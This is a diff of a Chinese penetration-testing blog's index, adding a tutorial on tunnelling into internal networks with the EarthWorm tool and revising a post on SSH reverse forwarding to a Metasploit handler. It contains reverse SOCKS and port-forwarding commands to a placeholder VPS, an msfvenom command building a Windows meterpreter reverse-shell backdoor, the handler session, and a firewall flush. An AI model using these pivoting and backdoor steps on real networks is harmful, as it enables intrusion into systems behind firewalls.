@@ -3,21 +3,78 @@
   
     
     <entry>
-      <title><![CDATA[ssh转发至内网msf]]></title>
+      <title><![CDATA[ew代理实战]]></title>
+      <url>/2018/01/29/ew_use.html</url>
+      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>渗透内网代理必不可少，本文做个记录</p>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>工具下载地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://rootkiter.com/EarthWorm/</div></pre></td></tr></table></figure>
+<p><strong>ssocksd开启 socks5 代理</strong></p>
+<p>环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">代理：192.168.211.131</div></pre></td></tr></table></figure></p>
+<p>首先使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./ew_for_linux64 -s ssocksd -l 12345</div></pre></td></tr></table></figure>
+<p>在  <code>192.168.211.131:12345</code> 开启了 <code>socks5</code> 代理，设置 <code>proxifier</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1517208105076mjnzg890.png?imageslim" alt="paste image"></p>
+<p>然后在  <code>192.168.211.131</code> 上监听一个端口， 在 <code>192.168.211.1</code> 使用代理连过去。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1517208193383wnwp9ord.png?imageslim" alt="paste image"><br>可以看到 在 <code>192.168.211.131</code> 收到的连接是由代理服务器 <code>192.168.211.131</code> 发起的</p>
+<p><strong>反弹 socks5 代理到公网vps</strong></p>
+<p>此时我们可以访问 公网vps, 通过在内网主机反弹 <code>socks5</code> 到公网，然后使用公网的 <code>socks5</code> 服务，连入内网。</p>
+<p>首先在公网主机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">./ew_for_linux64 -s rcsocks -l 1080 -e 8888</div><div class="line"></div><div class="line">-l  本地监听端口，待会连接这个端口作为 socks5 端口</div><div class="line">-e  反弹中转端口</div></pre></td></tr></table></figure>
+<p>在内网主机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">./ew_for_linux64 -s rssocks -d vps_ip -e 8888</div><div class="line"></div><div class="line">-d 指定反弹的主机，这里为 公网 vps 的 ip</div><div class="line">-e 指定反弹中转端口，和vps中的设置的一样</div></pre></td></tr></table></figure>
+<p>此时 <code>vps_ip:1080</code> 开启了 <code>socks5</code> 代理，设置 <code>proxifier</code><br><img src="http://oy9h5q2k4.bkt.clouddn.com/15172089986876saiwn28.png?imageslim" alt="paste image"><br>此时通过代理访问</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1517209095968899s55qo.png?imageslim" alt="paste image"></p>
+<p><strong>利用lcx_tran端口转发转接socks代理</strong></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1517209790860q4hk9v5w.png?imageslim" alt="paste image"><br>通过 <code>192.168.211.131</code> 的 <code>1088</code> 端口使用 <code>192.168.211.132</code> 在 <code>9999</code> 端口提供的 <code>socks5</code> 代理。</p>
+<p>在 <code>192.168.211.131</code> 执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">./ew_for_linux64 -s lcx_tran -l 1088 -f 192.168.211.132 -g 9999</div><div class="line"></div><div class="line">将来自 1088 的数据转发至 192.168.211.132:9999</div></pre></td></tr></table></figure>
+<p>在 <code>192.168.211.132</code> 执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ew_for_Win.exe -s ssocksd -l 9999</div></pre></td></tr></table></figure></p>
+<p>然后使用 <code>192.168.211.131:1088</code> 作为 <code>socks5</code> 代理即可</p>
+<p><strong> lcx_slave 反向端口转发</strong></p>
+<p>使用 <code>lcx_slave</code> 实现将内网端口映射到公网。</p>
+<p>首先在公网主机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">./ew_for_linux64 -s lcx_listen -l 12234 -e 8989</div><div class="line"></div><div class="line">lcx_listen 本地端口转发，将 12234 转发到 8989</div></pre></td></tr></table></figure>
+<p>然后在内网主机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ew_for_Win.exe -s lcx_slave -d vps_ip -e 8989 -f 127.0.0.1 -g 9999</div><div class="line"></div><div class="line">lcx_slave 将 vps_ip:8989 的数据转发至   127.0.0.1:9999</div></pre></td></tr></table></figure>
+<p>然后访问 <code>vps_ip:12234</code> 就是访问 <code>内网主机ip:9999</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">【参数说明】</div><div class="line"></div><div class="line">ssocksd 本地 socks代理</div><div class="line">rssocks 反弹 socks代理</div><div class="line"></div><div class="line">lcx_slave  将远程主机的端口 与 另一台主机建立联系</div><div class="line">lcx_tran  将本地端口转发至远程主机</div><div class="line">lcx_listen 本地端口转发，本地端口之间建立转发关系</div></pre></td></tr></table></figure>]]></content>
+      
+        <categories>
+            
+            <category> 渗透测试 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 端口转发 </tag>
+            
+            <tag> ew </tag>
+            
+            <tag> 代理 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[SSH反向代理转发至内网msf]]></title>
       <url>/2018/01/28/ssh_to_msf.html</url>
       <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>买了个便宜的 <code>vps</code> , 在上面装 <code>msf</code> 也装不上，于是想着把端口映射到内网来。</p>
 <h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>拓扑如下：</p>
 <p><img src="http://oy9h5q2k4.bkt.clouddn.com/15171288094759demmuh7.png?imageslim" alt="paste image"></p>
 <p>首先在内网主机 <code>B</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -fCNR 7281:localhost:5000 root@C_IP</div></pre></td></tr></table></figure>
+<p>执行完后会把 <code>B:5000</code> 反弹到 <code>C_IP:7281</code>.此时 <code>C</code> 监听 <code>127.0.0.1:7281</code></p>
 <p>然后然后在 公网中转服务器 <code>C</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -fCNL *:5586:localhost:7281 localhost</div></pre></td></tr></table></figure>
-<p>此时端口转发完成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ssh -fCNL *:5586:localhost:7281 localhost</div><div class="line"></div><div class="line">将*:5586---&gt;localhost:7281</div></pre></td></tr></table></figure>
+<p>此时 <code>C</code>监听 <code>0.0.0.0:5586</code>, 并将<code>0.0.0.0:5586</code>的数据转发至 <code>localhost:7281</code></p>
 <p>连接  <code>C_IP:5586</code>  就是连接  <code>B_IP:5000</code></p>
 <p>然后使用 <code>msf</code> 生成后门，反弹到 <code>C_IP:5586</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=C_IP LPORT=5586 -f exe &gt; /data/test.exe</div></pre></td></tr></table></figure></p>
 <p>然后在内网主机 <code>B</code> 设置好 <code>handler</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler </div><div class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp</div><div class="line">^[[A^[[Apayload =&gt; windows/meterpreter/reverse_tcp</div><div class="line">msf exploit(handler) &gt; set lport 5000</div><div class="line">lport =&gt; 5000</div><div class="line">msf exploit(handler) &gt; set lhost 0.0.0.0</div><div class="line">lhost =&gt; 0.0.0.0</div><div class="line">msf exploit(handler) &gt; show options </div><div class="line">Module options (exploit/multi/handler):</div><div class="line"></div><div class="line">   Name  Current Setting  Required  Description</div><div class="line">   ----  ---------------  --------  -----------</div><div class="line"></div><div class="line">Payload options (windows/meterpreter/reverse_tcp):</div><div class="line"></div><div class="line">   Name      Current Setting  Required  Description</div><div class="line">   ----      ---------------  --------  -----------</div><div class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</div><div class="line">   LHOST     0.0.0.0          yes       The listen address</div><div class="line">   LPORT     5000             yes       The listen port</div><div class="line"></div><div class="line">Exploit target:</div><div class="line"></div><div class="line">   Id  Name</div><div class="line">   --  ----</div><div class="line">   0   Wildcard Target</div><div class="line"></div><div class="line">msf exploit(handler) &gt; exploit </div><div class="line">[*] Started reverse TCP handler on 0.0.0.0:5000</div></pre></td></tr></table></figure>
-<p>运行，数据流如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">A --&gt; C_IP:5586 ---&gt; B_IP:5000</div></pre></td></tr></table></figure></p>
+<p>运行，数据流如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">A --&gt; C_IP:5586 ---&gt;  C_IP:7281 ---&gt; B_IP:5000</div></pre></td></tr></table></figure></p>
 <p><code>vultr</code>默认开启了 <code>iptables</code> 先 <code>iptables -F</code> 清理才能访问端口。</p>
 ]]></content>
       
